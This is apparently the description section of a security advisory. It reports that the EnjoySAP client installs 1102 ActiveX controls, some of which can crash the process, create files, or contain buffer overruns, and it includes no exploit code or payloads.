Description
===========
EnjoySAP, also know as Enjoy is the most popular SAP GUI used today.  The
latest version can be obtained from ftp://ftp.sap.com/pub/sapgui/win/

When installing EnjoySAP, in appreciation of its vast size for being a
client (around 500MB), there are an astounding 1102 ActiveX controls
installed.

A relatively brief examinaton of these controls, found a large number of
instances that would terminate EnjoySAP process, there were a number that
could create files on the file system (there unfortunately exists no
ability to inject content into these created files) and a number of
bufferoverruns.
